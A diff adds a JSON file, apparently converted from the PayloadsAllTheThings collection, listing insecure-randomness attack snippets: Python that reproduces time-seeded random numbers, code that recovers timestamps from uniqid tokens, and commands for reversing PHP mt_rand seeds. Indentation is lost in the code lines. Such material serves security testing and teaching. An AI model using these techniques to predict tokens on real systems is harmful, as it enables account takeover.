@@ -1,0 +1,54 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "insecure_randomness",
+  "original_category": "Insecure Randomness",
+  "payloads": [
+    {
+      "category": "Time-Based Seeds",
+      "escalation": "baseline",
+      "lines": [
+        "import random",
+        "import time",
+        "seed = int(time.time())",
+        "random.seed(seed)",
+        "print(random.randint(1, 100))",
+        "import random",
+        "import time",
+        "seed = int(time.mktime(time.strptime('2024-11-10 13:37', '%Y-%m-%d %H:%M')))",
+        "random.seed(seed)",
+        "print(random.randint(1, 100))"
+      ]
+    },
+    {
+      "category": "Tools",
+      "escalation": "baseline",
+      "lines": [
+        "import math",
+        "import datetime",
+        "def uniqid(timestamp: float) -> str:",
+        "sec = math.floor(timestamp)",
+        "usec = round(1000000 * (timestamp - sec))",
+        "return \"%8x%05x\" % (sec, usec)",
+        "def reverse_uniqid(value: str) -> float:",
+        "sec = int(value[:8], 16)",
+        "usec = int(value[8:], 16)",
+        "return float(f\"{sec}.{usec}\")",
+        "tokens = [\"6659cea087cd6\" , \"6659cea087cea\"]",
+        "for token in tokens:",
+        "t = float(reverse_uniqid(token))",
+        "d = datetime.datetime.fromtimestamp(t)",
+        "print(f\"{token} - {t} => {d}\")"
+      ]
+    },
+    {
+      "category": "mt_rand",
+      "escalation": "baseline",
+      "lines": [
+        "./display_mt_rand.php 12345678 123",
+        "712530069 674417379",
+        "./reverse_mt_rand.py 712530069 674417379 123 1"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.871Z"
+}
